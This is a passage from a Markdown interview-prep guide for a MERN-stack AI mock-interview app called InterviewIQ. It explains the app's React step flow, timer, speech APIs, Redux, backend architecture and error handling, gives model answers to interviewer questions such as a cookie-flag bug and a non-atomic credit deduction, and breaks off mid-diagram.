```mermaid
flowchart TD
    A["App.jsx<br/>Routes + Session Restore"] --> B["Home.jsx<br/>Landing page"]
    A --> C["Auth.jsx<br/>Google Login"]
    A --> D["InterviewPage.jsx<br/>Step Manager"]
    A --> E["InterviewHistory.jsx<br/>Past interviews"]
    A --> F["Pricing.jsx<br/>Credit plans"]
    A --> G["InterviewReport.jsx<br/>Single report view"]
    
    D --> H["Step1SetUp.jsx<br/>Resume upload + Config"]
    D --> I["Step2Interview.jsx<br/>Questions + Timer + Answers"]
    D --> J["Step3Report.jsx<br/>Analytics + PDF download"]
    
    I --> K["Timer.jsx<br/>Circular countdown"]
    
    subgraph "Shared Components"
        L["Navbar.jsx"]
        M["Footer.jsx"]
        N["AuthModel.jsx"]
    end
```

### ❓ Q: How does the interview step flow work?

**`InterviewPage.jsx` manages which step is visible:**

```jsx
// InterviewPage.jsx — Controls the 3-step flow:
function InterviewPage() {
    const [step, setStep] = useState(1)
    const [interviewData, setInterviewData] = useState(null)
    const [report, setReport] = useState(null)

    // Step 1 → Step 2: When interview starts
    const handleStart = (data) => {
        setInterviewData(data)
        setStep(2)
    }

    // Step 2 → Step 3: When interview finishes
    const handleFinish = (data) => {
        setReport(data)
        setStep(3)
    }

    return (
        <>
            {step === 1 && <Step1SetUp onStart={handleStart} />}
            {step === 2 && <Step2Interview interviewData={interviewData} onFinish={handleFinish} />}
            {step === 3 && <Step3Report report={report} />}
        </>
    )
}
```

```mermaid
stateDiagram-v2
    [*] --> Step1_Setup
    Step1_Setup --> Step2_Interview: onStart(interviewData)
    Step2_Interview --> Step3_Report: onFinish(reportData)
    Step3_Report --> [*]: Navigate to /history
    
    state Step1_Setup {
        [*] --> UploadResume
        UploadResume --> AnalyzeResume: Click "Analyze"
        AnalyzeResume --> ShowExtractedData: AI returns role/skills
        ShowExtractedData --> ConfigureMode: Select HR/Technical
        ConfigureMode --> GenerateQuestions: Click "Start"
    }
    
    state Step2_Interview {
        [*] --> IntroPhase
        IntroPhase --> ShowQuestion: AI greets candidate
        ShowQuestion --> WaitForAnswer: Timer starts
        WaitForAnswer --> SubmitAnswer: User submits or timer=0
        SubmitAnswer --> ShowFeedback: AI evaluates
        ShowFeedback --> ShowQuestion: "Next Question"
        ShowFeedback --> FinishInterview: All questions done
    }
    
    state Step3_Report {
        [*] --> ShowCharts
        ShowCharts --> DownloadPDF: Click "Download"
    }
```

### ❓ Q: How does the countdown timer work?

**Your `Step2Interview.jsx` manages the timer:**

```js
// Timer countdown effect
useEffect(() => {
    if (isIntroPhase) return;      // Don't count during AI greeting
    if (!currentQuestion) return;   // Safety check
    
    const timer = setInterval(() => {   // Run every 1000ms (1 second)
        setTimeLeft((prev) => {
            if (prev <= 1) {
                clearInterval(timer)     // Stop the timer at 0
                return 0;
            }
            return prev - 1              // Decrement by 1
        })
    }, 1000);

    return () => clearInterval(timer)    // Cleanup on unmount/re-render
}, [isIntroPhase, currentIndex])          // Reset when question changes
```

```mermaid
flowchart TD
    A["Question displayed<br/>timeLeft = 60"] --> B["setInterval starts<br/>Every 1000ms"]
    B --> C["timeLeft = 59"]
    C --> D["timeLeft = 58"]
    D --> E["... continues ..."]
    E --> F["timeLeft = 1"]
    F --> G["timeLeft = 0<br/>clearInterval()"]
    G --> H{"Check: timeLeft === 0?"}
    H --> I["Auto-submit answer via useEffect"]
    
    J["User clicks 'Next Question'"] --> K["currentIndex changes"]
    K --> L["useEffect cleanup: clearInterval(old timer)"]
    L --> M["New useEffect: start fresh timer for new question"]
```

**Auto-submit when timer hits 0:**

```js
useEffect(() => {
    if (isIntroPhase) return;
    if (!currentQuestion) return;
    if (timeLeft === 0 && !isSubmitting && !feedback) {
        submitAnswer()   // Force submission with whatever answer exists
    }
}, [timeLeft]);
```

### ❓ Q: How does Speech Recognition (Voice Input) work?

```js
// Initialize Web Speech API
useEffect(() => {
    if (!("webkitSpeechRecognition" in window)) return; // Check browser support

    const recognition = new window.webkitSpeechRecognition();
    recognition.lang = "en-US";           // Language
    recognition.continuous = true;         // Don't stop after one sentence
    recognition.interimResults = false;    // Only final results

    recognition.onresult = (event) => {
        const transcript = event.results[event.results.length - 1][0].transcript;
        setAnswer((prev) => prev + " " + transcript);  // Append to textarea
    };

    recognitionRef.current = recognition;
}, []);
```

**Flow:**

```mermaid
sequenceDiagram
    participant User as 🎤 User speaks
    participant API as Web Speech API
    participant State as React State

    User->>API: "I used React hooks for state management"
    API->>API: Processes audio → text
    API->>State: onresult: transcript = "I used React hooks..."
    State->>State: setAnswer(prev + " " + transcript)
    Note right of State: Textarea shows the spoken text
```

### ❓ Q: How does Text-to-Speech (AI Speaking) work?

```js
const speakText = (text) => {
    return new Promise((resolve) => {
        const utterance = new SpeechSynthesisUtterance(humanText);
        utterance.voice = selectedVoice;   // Chosen voice (female/male)
        utterance.rate = 0.92;              // Slightly slower for natural feel
        utterance.pitch = 1.05;             // Slightly higher for warmth
        
        utterance.onstart = () => {
            setIsAIPlaying(true);
            stopMic();                      // Mute user's mic while AI talks
            videoRef.current?.play();        // Play avatar video
        };
        
        utterance.onend = () => {
            videoRef.current?.pause();       // Stop avatar
            setIsAIPlaying(false);
            if (isMicOn) startMic();         // Resume mic
            resolve();                        // Resolve the promise
        };
        
        window.speechSynthesis.speak(utterance);
    });
};
```

**Key design decision:** The function returns a `Promise` so you can `await` it:

```js
// This ensures sequential speech:
await speakText("Hi Siddhesh, great to meet you.");     // Waits for this to finish
await speakText("I'll ask you a few questions.");        // Then says this
setIsIntroPhase(false);                                   // Then moves to questions
```

Without `await`, both phrases would try to play simultaneously!

---

## Section 10: Redux Toolkit — State Management

### ❓ Q: What problem does Redux solve?

**Without Redux (Prop Drilling):**

```mermaid
flowchart TD
    A["App.jsx<br/>has userData state"] --> B["Navbar.jsx<br/>needs userData for credits display"]
    A --> C["InterviewPage.jsx<br/>doesn't need userData"] --> D["Step1SetUp.jsx<br/>needs userData for credits check"]
    A --> E["Pricing.jsx<br/>needs userData for purchase"]
    
    style C fill:#ff9999
    
    Note1["❌ InterviewPage doesn't need userData<br/>but must pass it as prop to Step1SetUp"]
```

**With Redux (Global Store):**

```mermaid
flowchart TD
    A["Redux Store<br/>{ user: { userData: {...} } }"] 
    A --> B["Navbar.jsx<br/>useSelector reads directly"]
    A --> C["Step1SetUp.jsx<br/>useSelector reads directly"]
    A --> D["Pricing.jsx<br/>useSelector reads directly"]
    
    Note1["✅ Any component reads from store<br/>No unnecessary prop passing"]
```

### ❓ Q: Walk through your Redux setup

**`redux/store.js`:**
```js
import { configureStore } from '@reduxjs/toolkit'
import userSlice from "./userSlice"

export default configureStore({
    reducer: {
        user: userSlice    // state.user → managed by userSlice
    },
})
```

**`redux/userSlice.js`:**
```js
import { createSlice } from "@reduxjs/toolkit";

const userSlice = createSlice({
    name: "user",                    // Slice name (prefix for action types)
    initialState: {
        userData: null               // null = not logged in
    },
    reducers: {
        setUserData: (state, action) => {
            state.userData = action.payload   // Replace userData with new value
        }
    }
})

export const { setUserData } = userSlice.actions  // Action creator
export default userSlice.reducer                    // Reducer function
```

**How it's used across the app:**

```js
// READING from store (any component):
const { userData } = useSelector((state) => state.user);
// state.user.userData → { name: "Sid", email: "sid@gmail.com", credits: 100 }

// WRITING to store (dispatching actions):
const dispatch = useDispatch();
dispatch(setUserData(result.data));           // Set user data
dispatch(setUserData(null));                  // Clear user (logout)
dispatch(setUserData({...userData, credits: result.data.creditsLeft})); // Update credits
```

### ❓ Q: Why does Redux Toolkit use what looks like mutation?

In normal JavaScript, you should never mutate state:
```js
// ❌ Direct mutation — BAD in React
state.userData = newData;
```

But Redux Toolkit uses **Immer** under the hood:
```js
// ✅ Looks like mutation, but Immer creates a NEW object behind the scenes
setUserData: (state, action) => {
    state.userData = action.payload  // Immer intercepts this "mutation"
}
```

**Immer** tracks your changes and produces a brand-new immutable state object. You write simple-looking code, but it's actually safe.

---

## Section 11: Complete Data Flow — End to End

### ❓ Q: Trace the ENTIRE flow from user opening the app to downloading a PDF report

```mermaid
flowchart TD
    A["🌐 User opens app"] --> B["App.jsx useEffect runs"]
    B --> C["GET /api/user/current-user<br/>(with HTTP-only cookie)"]
    C -->|"Cookie valid"| D["User data → Redux store"]
    C -->|"No cookie"| E["userData = null → Show login page"]
    
    D --> F["User clicks 'Start Interview'"]
    F --> G["Step1SetUp renders"]
    
    G --> H["User uploads PDF resume"]
    H --> I["POST /api/interview/resume<br/>(FormData with file)"]
    I --> J["Multer saves file"]
    J --> K["pdfjs-dist extracts text"]
    K --> L["Gemini AI parses → JSON<br/>{role, skills, projects, experience}"]
    L --> M["Delete PDF file"]
    M --> N["Response → Frontend shows extracted data"]
    
    N --> O["User confirms & clicks 'Start'"]
    O --> P["POST /api/interview/generate-questions"]
    P --> Q{"User has ≥50 credits?"}
    Q -->|"No"| R["❌ 400: Not enough credits"]
    Q -->|"Yes"| S["Gemini generates 10 questions"]
    S --> T["Deduct 50 credits"]
    T --> U["Create Interview document in MongoDB"]
    U --> V["Response: questions + interviewId"]
    
    V --> W["Step2Interview renders"]
    W --> X["AI speaks greeting via TTS"]
    X --> Y["AI speaks question"]
    Y --> Z["Timer starts counting down"]
    Z --> AA["User types/speaks answer"]
    AA --> AB["POST /api/interview/submit-answer"]
    AB --> AC["Gemini evaluates answer"]
    AC --> AD["Score + feedback saved to DB"]
    AD --> AE{"More questions?"}
    AE -->|"Yes"| Y
    AE -->|"No"| AF["POST /api/interview/finish"]
    AF --> AG["Calculate averages, mark completed"]
    
    AG --> AH["Step3Report renders"]
    AH --> AI["Show charts with Recharts"]
    AI --> AJ["User clicks 'Download PDF'"]
    AJ --> AK["jsPDF generates PDF in browser"]
    AK --> AL["📄 PDF downloaded!"]
```

---

## Section 12: System Design & Architecture

### ❓ Q: Explain the overall architecture of your project

```mermaid
graph TD
    subgraph "Frontend (Render Static Site)"
        A["React 19 + Vite"]
        B["Redux Toolkit"]
        C["React Router v7"]
        D["Framer Motion"]
        E["Recharts"]
        F["jsPDF"]
    end
    
    subgraph "Backend (Render Web Service)"
        G["Express.js"]
        H["Controllers"]
        I["Middlewares"]
        J["Services"]
    end
    
    subgraph "External Services"
        K["MongoDB Atlas"]
        L["Google Gemini API"]
        M["Razorpay"]
    end
    
    A -->|"HTTP/REST<br/>Axios + withCredentials"| G
    G --> H
    I --> H
    H --> J
    J --> L
    J --> M
    H --> K
    B --> A
    C --> A
    D --> A
    E --> A
    F --> A
```

### ❓ Q: What design pattern does the backend follow?

**MVC (Model-View-Controller) — modified for APIs:**

```
server/
├── config/          → Configuration (DB connection, JWT token generation)
│   ├── connectDb.js
│   └── token.js
│
├── models/          → MODEL — Data structure definitions (Mongoose schemas)
│   ├── user.model.js
│   ├── interview.model.js
│   └── payment.model.js
│
├── controllers/     → CONTROLLER — Business logic (what to do with data)
│   ├── auth.controller.js
│   ├── interview.controller.js
│   ├── payment.controller.js
│   └── user.controller.js
│
├── routes/          → ROUTING — Which URL maps to which controller
│   ├── auth.route.js
│   ├── interview.route.js
│   ├── payment.route.js
│   └── user.route.js
│
├── middlewares/     → MIDDLEWARE — Functions that run before controllers
│   ├── isAuth.js
│   └── multer.js
│
├── services/        → SERVICES — External API wrappers
│   ├── openRouter.service.js  (Gemini)
│   └── razorpay.service.js
│
└── index.js         → ENTRY POINT — Sets up Express, applies middleware, mounts routes
```

**Why separation matters:**
- **Models** don't know about HTTP requests
- **Controllers** don't know about database internals
- **Routes** don't contain business logic
- **Services** don't know about the rest of the app

If you need to switch from MongoDB to PostgreSQL, you only change the models. If you switch from Gemini to OpenAI, you only change the service.

### ❓ Q: How would you scale this to 100,000 users?

```mermaid
flowchart TD
    subgraph "Current Architecture (Single Instance)"
        A["User"] --> B["1 Express Server"]
        B --> C["1 MongoDB"]
    end
    
    subgraph "Scaled Architecture"
        D["Users"] --> E["CDN (Cloudflare)<br/>Serves React static files"]
        D --> F["Load Balancer"]
        F --> G["Express Server 1"]
        F --> H["Express Server 2"]
        F --> I["Express Server 3"]
        G --> J["Redis Cache<br/>User sessions, credits"]
        H --> J
        I --> J
        G --> K["MongoDB Atlas<br/>Replica Set"]
        H --> K
        I --> K
        G --> L["BullMQ Job Queue<br/>AI calls go here"]
        H --> L
        I --> L
        L --> M["Worker Process<br/>Calls Gemini API"]
    end
```

**Key changes needed:**
1. **Load balancer** — Distributes requests across multiple server instances
2. **Redis cache** — Cache user credits so every API call doesn't hit MongoDB
3. **Job queue (BullMQ)** — AI calls take 3-5 seconds; put them in a queue instead of blocking the server
4. **MongoDB Replica Set** — Primary + Secondary nodes for high availability
5. **CDN** — Serve React bundle from edge servers worldwide
6. **Rate limiting** — Prevent one user from making 1000 AI calls/hour

---

## Section 13: Error Handling & Edge Cases

### ❓ Q: How do you handle errors in your project?

**Pattern: try-catch in every controller**

```js
export const analyzeResume = async (req, res) => {
    try {
        // Happy path — everything works
        // ...
        res.json(data);
    } catch (error) {
        // Sad path — something went wrong
        console.error(error);  // Log for debugging
        
        // Clean up resources even on failure
        if (req.file && fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }
        
        // Send a clean error response to client
        return res.status(500).json({ message: error.message });
    }
};
```

### ❓ Q: List all the edge cases your project handles

| Edge Case | Where | How |
|---|---|---|
| No resume file uploaded | `analyzeResume` | Check `if (!req.file)` → 400 |
| Empty AI response | `generateQuestion` | Check `if (!aiResponse \|\| !aiResponse.trim())` → 500 |
| User has < 50 credits | `generateQuestion` | Check `if (user.credits < 50)` → 400 |
| No answer submitted | `submitAnswer` | Set score=0, skip AI call |
| Timer exceeded | `submitAnswer` | Check `if (timeTaken > question.timeLimit)` → score=0 |
| AI returns code fences | `analyzeResume`, `submitAnswer` | Strip with `.replace(/```json/g, "")` |
| JSON parse fails | All AI calls | try-catch around `JSON.parse()` |
| PDF file cleanup on error | `analyzeResume` | Delete file in catch block |
| Payment processed twice | `verifyPayment` | Check `if (payment.status === "paid")` |
| Invalid payment signature | `verifyPayment` | HMAC comparison |
| User not found | `generateQuestion` | Check `if (!user)` → 404 |
| Interview not found | `finishInterview` | Check `if (!interview)` → 400 |
| Cookie missing/expired | `isAuth` | Check `if (!token)` → 400 |

---

## Section 14: Deployment & Environment

### ❓ Q: How do environment variables work?

```mermaid
flowchart TD
    subgraph "Development (your laptop)"
        A[".env file (Git-ignored)"]
        B["dotenv.config() loads into process.env"]
        A --> B
    end
    
    subgraph "Production (Render)"
        C["Environment Variables set in Render Dashboard"]
        D["process.env automatically populated"]
        C --> D
    end
    
    B --> E["process.env.JWT_SECRET"]
    D --> E
    E --> F["Same code works in both environments"]
```

**Your .env variables:**
```env
PORT=6000                              # Server port
MONGODB_URL=mongodb+srv://...          # Database connection string
JWT_SECRET=my-super-secret-key         # JWT signing key
OPENROUTER_API_KEY=AIza...             # Gemini API key
RAZORPAY_KEY_ID=rzp_test_...           # Razorpay public key
RAZORPAY_KEY_SECRET=...                # Razorpay secret key
```

### ❓ Q: How does Vite handle dev vs production URLs?

```js
// App.jsx
export const ServerUrl = import.meta.env.MODE === "development"
    ? "http://localhost:6000"                                   // Dev
    : "https://interviewiq-ai-interview-agent.onrender.com";   // Prod
```

**How `import.meta.env.MODE` works:**
- `npm run dev` → Vite sets `MODE = "development"` → Uses localhost
- `npm run build` → Vite sets `MODE = "production"` → Uses Render URL

This is a Vite-specific feature. In Create React App, you'd use `process.env.NODE_ENV`.

---

## Section 15: Tricky Interviewer Questions

### ❓ Q: "What happens if the Gemini API is down?"

**Current behavior:** The server returns a 500 error. The try-catch in `askAi()` catches the Axios error and throws it up to the controller.

**Better answer (show you've thought about it):**
```
"Currently it returns a 500 error. But for production, I'd add:
1. Retry logic with exponential backoff — retry 3 times with 1s, 2s, 4s delays
2. Circuit breaker — if it's been failing for 5 minutes, stop trying
3. Fallback AI provider — the service abstraction makes this easy
4. Graceful error message to user — 'AI is temporarily unavailable, please try later'"
```

### ❓ Q: "There's a bug in your auth code. Can you spot it?"

Yes! In `auth.controller.js`:

```js
res.cookie("token", token, {
    http: true,        // ⚠️ BUG: Should be "httpOnly: true"
    secure: true,
    sameSite: "none",
    maxAge: 7 * 24 * 60 * 60 * 1000
})
```

The property is `httpOnly` (camelCase), not `http`. With `http: true`, Express ignores it and the cookie is NOT HTTP-only, making it vulnerable to XSS attacks.

### ❓ Q: "Your timer is client-side. How do you prevent cheating?"

**Answer:** Defense in depth:

```
Client-side: Timer.jsx counts down → auto-submits at 0
Server-side: submitAnswer checks if (timeTaken > question.timeLimit) → score = 0

Even if user opens DevTools and stops the timer, the server still validates.
The server is the source of truth.
```

### ❓ Q: "What if a user uploads a 50-page resume?"

**Current protections:**
1. Multer limits file size to 5MB: `limits: { fileSize: 5 * 1024 * 1024 }`
2. Text sanitization: `.replace(/\s+/g, " ").trim()` reduces whitespace
3. Gemini's context window would truncate very long texts

**Better answer:** "I'd also add a page count limit after parsing — reject resumes over 5 pages. Most real resumes are 1-2 pages."

### ❓ Q: "Is your credit deduction atomic?"

**Honest answer: No.** Your current code does:

```js
user.credits -= 50;    // Read-modify in JavaScript
await user.save();     // Write to MongoDB
```

If two requests hit simultaneously, both could read `credits = 100`, both subtract 50, both write 50 — the user spent 50 but should have spent 100.

**Better approach:**
```js
const result = await User.findOneAndUpdate(
    { _id: req.userId, credits: { $gte: 50 } },  // Only if credits >= 50
    { $inc: { credits: -50 } },                    // Atomic decrement
    { new: true }
);
if (!result) return res.status(400).json({ message: "Not enough credits" });
```

### ❓ Q: "You said you built this yourself. Which part was hardest?"

**Be honest. A good answer:**
```
"Making AI output reliable was the hardest. The first version broke constantly
because Gemini would return text with code fences, extra explanations, or
malformed JSON. I had to:
1. Rewrite prompts multiple times to be stricter
2. Add sanitization to strip code fences
3. Wrap every JSON.parse in try-catch
4. Add empty-response checks

The key learning: never trust external API output. Always validate and sanitize."
```

### ❓ Q: "If I asked you to add a feature — say, interview history with filters — how would you approach it?"

**Answer framework (show your thinking process):**

```
1. UNDERSTAND: What filters? By date? By mode (HR/Technical)? By score range?
2. BACKEND: Modify getMyInterviews controller to accept query params:
   GET /api/interview/get-interview?mode=Technical&minScore=5&sortBy=createdAt
3. DATABASE: Add index on Interview.mode if filtering by it
4. FRONTEND: Add filter UI components (dropdowns, date pickers)
5. API CALL: Pass filters as query params in Axios request
6. TEST: Edge cases — no results, invalid filter values, pagination for large histories
```

---

## Section 16: Architecture — Interview Q&A (Full Deep Dive)

> This section answers the 15 most common architecture interview questions about InterviewIQ.
> Every answer references **your actual code** and teaches the **concept behind it**.

---

### ❓ Q1: Explain InterviewIQ from start to finish.

**How to answer (structured narrative — use this exact flow):**

InterviewIQ is an AI-powered mock interview platform. Here's the complete lifecycle:

```mermaid
flowchart TD
    A["👤 User lands on the app"] --> B["🔐 Login with Google OAuth"]
    B --> C["📄 Upload PDF Resume"]
    C --> D["🤖 AI (Gemini) parses resume<br/>Extracts: role, skills, projects, experience"]
    D --> E["✅ User confirms extracted data<br/>Selects mode: HR or Technical"]
    E --> F["💰 50 credits deducted"]
    F --> G["🤖 AI generates 10 personalized questions<br/>Easy(1-3) → Medium(4-7) → Hard(8-10)"]
    G --> H["⏱️ User answers each question under timer<br/>60s / 90s / 120s based on difficulty"]
    H --> I["🤖 AI evaluates each answer<br/>Scores: Confidence, Communication, Correctness"]
    I --> J{"More questions?"}
    J -->|"Yes"| H
    J -->|"No"| K["📊 Show analytics dashboard<br/>Charts, scores, feedback"]
    K --> L["📥 Download PDF performance report"]
    
    M["💳 If credits run out"] --> N["Buy credits via Razorpay"]
    N --> O["HMAC signature verification"]
    O --> P["Credits added atomically ($inc)"]
    P --> F
```

**In one breath (practice saying this aloud):**

> *"InterviewIQ solves the problem of generic interview prep. A user logs in with Google, uploads their PDF resume, which is parsed by the Gemini AI to extract structured data — role, skills, projects. Based on this, Gemini generates 10 progressively difficult questions specific to that user's background. The user answers each question under a strict timer. Each answer is evaluated by AI in real-time, scoring confidence, communication, and correctness. At the end, the user sees an analytics dashboard and can download a full PDF report. The platform is monetized through a credit system integrated with Razorpay payments."*

**What makes this a strong answer:** You covered all 5 pillars — **Auth → AI Parsing → AI Generation → AI Evaluation → Analytics/Reports** — in one connected flow.

---

### ❓ Q2: What problem does InterviewIQ solve?

**Answer (show you understand the user's pain, not just the tech):**

There are **3 core problems** this solves:

| Problem | How most people solve it | How InterviewIQ solves it |
|---|---|---|
| **Generic questions** | Memorize from GeeksforGeeks / LeetCode | AI reads YOUR resume and generates questions about YOUR skills and projects |
| **No real feedback** | Ask a friend "how was it?" | AI scores each answer on 3 dimensions (Confidence, Communication, Correctness) with specific actionable feedback |
| **No pressure practice** | Practice alone with no time constraint | Strict countdown timer (60s/90s/120s) simulates real interview pressure |

**The deeper insight (this impresses interviewers):**

> *"The key insight is that interview prep is inherently personalized. A React developer and a DevOps engineer need completely different questions. Instead of maintaining a static question bank, we use AI as a dynamic question engine that creates unique questions for every user, every time. This means two users with different resumes get entirely different interviews — which is exactly how real interviews work."*

---

### ❓ Q3: Why did you choose this architecture?

**Answer:**

I chose a **3-tier client-server architecture with an AI service layer**:

```mermaid
graph TB
    subgraph "Tier 1: Presentation (Client)"
        A["React 19 + Vite<br/>TailwindCSS, Framer Motion<br/>Redux Toolkit"]
    end
    
    subgraph "Tier 2: Application Logic (Server)"
        B["Express.js REST API<br/>Controllers, Middleware<br/>Route Groups"]
    end
    
    subgraph "Tier 3: Data (Database)"
        C["MongoDB Atlas<br/>Mongoose ODM<br/>Users, Interviews, Payments"]
    end
    
    subgraph "Tier 2.5: External Services"
        D["Google Gemini API"]
        E["Razorpay"]
    end
    
    A -->|"HTTP/REST + Cookies"| B
    B --> C
    B --> D
    B --> E
```

**Why this architecture specifically:**

1. **Separation of Frontend & Backend** — They're deployed independently on Render. If the frontend goes down, the backend and database still work. If I need to update the React UI, I don't need to restart the API server.

2. **REST API (not GraphQL, not tRPC)** — Our data patterns are simple: upload a file, get questions, submit an answer. REST is perfect for CRUD-style operations. GraphQL would be overkill — we never have complex nested queries where the client picks which fields it wants.

3. **Service Layer for external APIs** — The Gemini API call lives in `openRouter.service.js`, NOT directly in controllers. This means:
   - Controllers don't know or care which AI provider we use
   - If Gemini's API changes or we switch to OpenAI, we modify ONE file
   - This is the **Adapter Pattern** in software engineering

4. **Monorepo with independent concerns** — One Git repo, but `client/` and `server/` have separate `package.json` files. This means:
   - No dependency conflicts (React doesn't need pdfjs-dist, server doesn't need Framer Motion)
   - Each side has its own `.env` file with its own secrets
   - Each side can be deployed to a different service

**What I'd say if pressed "why not microservices?":**

> *"For this scale and team size (solo developer), a monolithic backend is the right choice. Microservices add deployment complexity, inter-service communication overhead, and distributed tracing needs — all of which are unnecessary when a single Express server handles all 10 endpoints. I'd consider splitting into microservices only if I had distinct teams working on payments vs. interviews, or if the AI processing needed independent scaling."*

---

### ❓ Q4: Why Node.js and Express?

**Answer (give technical reasons, not "because it's popular"):**

**Why Node.js:**

```mermaid
flowchart LR
    subgraph "Node.js Event Loop — Non-Blocking I/O"
        A["Request 1: Upload PDF"] --> B["Start reading file from disk<br/>(I/O — non-blocking)"]
        B --> C["While waiting...<br/>Event loop handles other requests"]
        D["Request 2: Get user"] --> E["Start MongoDB query<br/>(I/O — non-blocking)"]
        E --> C
        C --> F["File read complete → Process PDF"]
        C --> G["MongoDB query complete → Return user"]
    end
```

1. **Non-blocking I/O is perfect for this project** — Every core operation in InterviewIQ is I/O-bound:
   - Reading PDF files from disk (`fs.promises.readFile`)
   - Calling Gemini API over HTTP (3-5 seconds wait)
   - Querying MongoDB (network I/O)
   
   Node.js doesn't block the entire server while waiting for these operations. While one request waits for the Gemini API to respond, other requests can be processed.

2. **Full-stack JavaScript** — Same language on frontend (React) and backend means:
   - Data structures flow naturally (JSON everywhere)
   - Can share logic/types if needed
   - Smaller cognitive load for a solo developer

3. **Rich ecosystem (npm)** — Every integration I needed had a mature library:
   - `pdfjs-dist` for PDF parsing
   - `jsonwebtoken` for JWT
   - `razorpay` SDK for payments
   - `multer` for file uploads

**Why Express specifically:**

| Express Alternative | Why I didn't use it |
|---|---|
| **Fastify** | Faster, but Express has a larger ecosystem and more community examples for integrations like Razorpay |
| **Koa** | Lighter, but requires more manual setup for middleware; Express has everything out of the box |
| **NestJS** | Full framework with decorators and DI — great for large teams, overkill for a solo project with 10 endpoints |
| **Raw `http` module** | No routing, no middleware, no JSON parsing — would write 10x more boilerplate code |

**Express gives exactly what I need:**
- `app.use(cors())` → Cross-origin support in 1 line
- `app.use(express.json())` → Automatic JSON body parsing
- `app.use(cookieParser())` → Cookie parsing
- `router.post("/resume", isAuth, upload.single("resume"), analyzeResume)` → Middleware chain in 1 line

---

### ❓ Q5: Why MongoDB?

**Answer:**

MongoDB was chosen for **3 specific technical reasons**, not just because it's trendy:

**Reason 1: The Interview-Question relationship is a natural document fit**

```mermaid
flowchart LR
    subgraph "MongoDB: 1 query to get everything"
        A["Interview Document<br/>{<br/>  role: 'Frontend Dev',<br/>  questions: [<br/>    {question: '...', score: 8, feedback: '...'},<br/>    {question: '...', score: 6, feedback: '...'},<br/>    ...<br/>  ]<br/>}"]
    end
    
    subgraph "SQL: 2 queries + JOIN needed"
        B["interviews table<br/>id | role | userId"] --- C["questions table<br/>id | interview_id | question | score"]
        D["SELECT * FROM interviews<br/>JOIN questions ON interviews.id = questions.interview_id<br/>WHERE interviews.id = ?"]
    end
```

An interview ALWAYS comes with its questions. Questions are NEVER read independently. In MongoDB, I embed them as a sub-document array — **one query gets everything**. In SQL, I'd need a JOIN every single time.

**Reason 2: Schema flexibility during development**

During development, I iterated on the question schema multiple times:
- First version: just `question` and `answer`
- Then added: `score` and `feedback`
- Then added: `confidence`, `communication`, `correctness`
- Then added: `difficulty` and `timeLimit`

In MongoDB, I just updated the Mongoose schema and new documents got the new fields. Old documents still worked (missing fields default to `0`). In SQL, I would have needed `ALTER TABLE` migrations for every change.

**Reason 3: JSON everywhere**

The entire data flow is JSON:
- Frontend sends JSON → Express receives JSON
- Gemini API returns JSON → Controller saves as JSON document
- MongoDB stores documents → Returns JSON to controller

No impedance mismatch. No ORM translation layer like Sequelize trying to map rows to objects.

**When I would NOT choose MongoDB:**
> *"If this were a banking or financial application where I need strong ACID transactions across multiple tables — like transferring credits between users — I'd use PostgreSQL. MongoDB's transaction support is newer and less battle-tested for complex multi-document operations. But for this use case, my operations are single-document (update one interview, update one user), which MongoDB handles atomically by default."*

---

### ❓ Q6: How does the frontend communicate with the backend?

**Answer:**

The frontend communicates via **HTTP REST API calls using Axios**, with **HTTP-only cookies for authentication**.

```mermaid
sequenceDiagram
    participant React as ⚛️ React (Browser)
    participant Express as 🖥️ Express (Server)
    
    Note over React,Express: Every request includes {withCredentials: true}<br/>so the browser auto-attaches the JWT cookie
    
    React->>Express: POST /api/interview/resume<br/>Content-Type: multipart/form-data<br/>Cookie: token=eyJhbG...<br/>Body: PDF file
    Express-->>React: 200 OK<br/>{ role, skills, projects, experience, resumeText }
    
    React->>Express: POST /api/interview/generate-questions<br/>Content-Type: application/json<br/>Cookie: token=eyJhbG...<br/>Body: { role, experience, mode, ... }
    Express-->>React: 200 OK<br/>{ interviewId, questions, creditsLeft }
    
    React->>Express: POST /api/interview/submit-answer<br/>Body: { interviewId, questionIndex, answer, timeTaken }
    Express-->>React: 200 OK<br/>{ feedback }
```

**Key technical details:**

**1. How Axios sends requests (from your `Step1SetUp.jsx`):**
```js
// For JSON data:
const result = await axios.post(
    ServerUrl + "/api/interview/generate-questions",
    { role, experience, mode, resumeText, projects, skills },  // JSON body
    { withCredentials: true }  // ← Critical: tells browser to send the cookie
)

// For file uploads:
const formdata = new FormData()
formdata.append("resume", resumeFile)  // Attach the file
const result = await axios.post(
    ServerUrl + "/api/interview/resume",
    formdata,                  // Axios auto-sets Content-Type: multipart/form-data
    { withCredentials: true }
)
```

**2. Why `withCredentials: true` is everywhere:**
- The frontend and backend are on **different Render subdomains** (cross-origin)
- By default, browsers do NOT send cookies to a different origin
- `withCredentials: true` tells the browser: "Yes, send my cookies with this request"
- On the server side, `cors({ credentials: true })` tells the browser: "Yes, I accept cookies from this origin"
- **Both sides must agree**, or cookies won't travel

**3. How the server URL switches between dev and prod:**
```js
// In App.jsx:
export const ServerUrl = import.meta.env.MODE === "development"
    ? "http://localhost:6000"
    : "https://interviewiq-ai-interview-agent.onrender.com";
// Vite sets MODE automatically based on npm run dev vs npm run build
```

**4. The communication is NOT real-time (no WebSockets):**
- Every interaction is a request → response cycle
- User sends an answer → waits → gets feedback back
- This means there's a loading state while waiting for AI response (3-5 seconds)
- WebSockets would allow streaming the AI response token by token (a future improvement)

---

### ❓ Q7: Explain the complete request-response flow.

**Let me trace one specific request: `POST /api/interview/submit-answer`**

This is the most complex request because it involves auth, database reads, AI calls, database writes, and scoring.

```mermaid
sequenceDiagram
    participant Browser as 🌐 Browser
    participant CORS as cors()
    participant JSON as express.json()
    participant Cookie as cookieParser()
    participant Auth as isAuth middleware
    participant Controller as submitAnswer()
    participant DB as MongoDB
    participant AI as Gemini API
    
    Browser->>CORS: POST /api/interview/submit-answer<br/>Cookie: token=eyJhbG...<br/>Body: {interviewId, questionIndex, answer, timeTaken}
    CORS->>CORS: Check: Is origin "interviewiq-...onrender.com"?
    CORS->>JSON: ✅ Origin allowed → next()
    JSON->>JSON: Parse JSON body → attach to req.body
    JSON->>Cookie: next()
    Cookie->>Cookie: Parse "token=eyJhbG..." → attach to req.cookies
    Cookie->>Auth: next()
    
    Auth->>Auth: Extract req.cookies.token
    Auth->>Auth: jwt.verify(token, JWT_SECRET)
    Note right of Auth: Decodes payload: {userId: "672abc..."}
    Auth->>Auth: req.userId = "672abc..."
    Auth->>Controller: next()
    
